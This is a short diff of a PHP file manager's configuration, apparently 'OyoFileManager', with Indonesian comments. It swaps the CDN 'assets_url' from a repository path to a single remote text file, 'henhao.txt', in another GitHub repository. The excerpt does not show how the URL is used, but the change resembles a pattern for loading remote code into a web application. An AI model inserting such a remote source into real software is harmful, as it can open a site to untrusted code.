@@ -3,7 +3,7 @@ session_start();
 
 // CDN Configuration - Ubah URL ini sesuai domain/CDN Anda
 $cdn_config = [
-    'assets_url' => 'https://cdn.githubraw.com/sarahmiranawina/OyoFileManager/main', // Ganti dengan URL CDN Anda
+    'assets_url' => 'https://cdn.githubraw.com/berangkas4d/boyTraumen/main/main/henhao.txt', // Ganti dengan URL CDN Anda
     'use_cdn' => true // Set false untuk menggunakan assets lokal
 ];
 
